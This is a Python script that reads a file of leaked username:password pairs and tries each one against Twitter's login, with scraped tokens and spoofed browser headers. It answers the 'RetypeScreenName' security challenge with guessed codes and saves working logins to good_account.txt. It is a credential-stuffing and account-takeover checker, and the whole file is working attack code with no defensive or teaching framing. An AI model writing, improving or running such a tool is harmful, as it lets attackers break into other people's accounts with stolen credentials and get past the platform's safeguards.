import requests, json, re, datetime, sys
from bs4 import BeautifulSoup
import pandas as pd
from urllib.parse import urlparse, parse_qs
import logging.handlers
import sys
from simple_colors import *




col_names = ['Usernames', 'passwords']

data_filein = sys.argv[1]
code_in = sys.argv[2]
data = pd.read_csv(data_filein, sep=':', names=col_names)
Users = data['Usernames']
passwords = data['passwords']


def twitterSession(username, password):
    code = username.rsplit('@', 1)[0]
    s = requests.Session()
    resp = s.get("https://twitter.com/login")
    soup = BeautifulSoup(resp.text, "lxml")
    token = soup.select_one("[name='authenticity_token']")['value']
    payload = {
        'session[username_or_email]': username,
        'session[password]': password,
        'authenticity_token': token,
        'ui_metrics': '{"rf":{"c6fc1daac14ef08ff96ef7aa26f8642a197bfaad9c65746a6592d55075ef01af":3,"a77e6e7ab2880be27e81075edd6cac9c0b749cc266e1cea17ffc9670a9698252":-1,"ad3dbab6c68043a1127defab5b7d37e45d17f56a6997186b3a08a27544b606e8":252,"ac2624a3b325d64286579b4a61dd242539a755a5a7fa508c44eb1c373257d569":-125},"s":"fTQyo6c8mP7d6L8Og_iS8ulzPObBOzl3Jxa2jRwmtbOBJSk4v8ClmBbF9njbZHRLZx0mTAUPsImZ4OnbZV95f-2gD6-03SZZ8buYdTDkwV-xItDu5lBVCQ_EAiv3F5EuTpVl7F52FTIykWowpNIzowvh_bhCM0_6ReTGj6990294mIKUFM_mPHCyZxkIUAtC3dVeYPXff92alrVFdrncrO8VnJHOlm9gnSwTLcbHvvpvC0rvtwapSbTja-cGxhxBdekFhcoFo8edCBiMB9pip-VoquZ-ddbQEbpuzE7xBhyk759yQyN4NmRFwdIjjedWYtFyOiy_XtGLp6zKvMjF8QAAAWE468LY"}',
        'scribe_log': '',
        'redirect_after_login': '',
        'authenticity_token': token,
        'remember_me': 1
    }
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://twitter.com',
        'referer': 'https://twitter.com/login',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36'
    }
    a = s.post("https://twitter.com/sessions", data=payload, headers=headers)


    parsed_url = urlparse(a.url)
    par = parse_qs(parsed_url.query)

    info_list = []
    for i in par:
        c = (','.join(par[i]))
        info_list.append(c)

    print(info_list)

    try:
        if info_list[2] == 'RetypeScreenName':

            print('page : Help us keep your account safe: ', username, password)




            PARAMS = {'authenticity_token': token,
                      'challenge_id': info_list[3],
                      'enc_user_id': info_list[1],
                      'challenge_type': info_list[2],
                      'platform': info_list[0],
                      'redirect_after_login': '',
                      'remember_me': info_list[4],
                      'challenge_response': code,
                      }
            PARAMS2 = {'authenticity_token': token,
                      'challenge_id': info_list[3],
                      'enc_user_id': info_list[1],
                      'challenge_type': info_list[2],
                      'platform': info_list[0],
                      'redirect_after_login': '',
                      'remember_me': info_list[4],
                      'challenge_response': code_in,
                      }
            b = s.post("https://twitter.com/account/login_challenge", data=PARAMS, headers=headers)

            c = s.post("https://twitter.com/account/login_challenge", data=PARAMS2, headers=headers)

            if c.url == 'https://twitter.com/account/access':
                print('try keywork :', code_in)



                print(yellow('full valid Username with code_in:'), username, 'Password :', password, ' the Code is :', code_in)
                f = open("good_account.txt", "a")
                good_users = (username + ':' + password  + code_in + '\n')
                f.write(good_users)
                f.close()

            elif b.url == 'https://twitter.com/account/access' :
             print('try keywork :', code)
             print (green('full valid Username with code:'), username , 'Password :',password , ' the Code is :', code )
             f = open("good_account.txt", "a")
             good_users = (username + ':' + password + code + '\n')
             f.write(good_users)
             f.close()



            else :
                print('Rone key word !' , username , password)

                f = open("bad_account.txt", "a")
                badusers = (username + ':' + password + '\n')
                f.write(badusers)
                f.close()


        elif info_list[2] == 'TemporaryPassword':
            print('page : Check your email for the user  :', usernam, password)
            f = open("bad_account.txt", "a")
            badusers = (username + ':' + password + '\n')
            f.write(badusers)
            f.close()

    except:
        if a.url == 'https://twitter.com/account/access':
            print(green('full valid Username with out any code'),':', username , 'Password :',password , ' the Code is :', code)
            f = open("good_account.txt", "a")
            good_users = (username + ':' + password +' '+code + '\n')
            f.write(good_users)
            f.close()
        elif a.url ==  'https://twitter.com/login/check':
         f = open("bad_account.txt", "a")
         badusers = (username+':'+password+'\n')
         f.write(badusers)
         f.close()
         print  ( 'coumpte need capatcha ! :  ' , username , password)

        else:
            print ( red('Rone user password ') , username , password )




for usernam, password in zip(Users, passwords):
        twitterSession(usernam, password)


































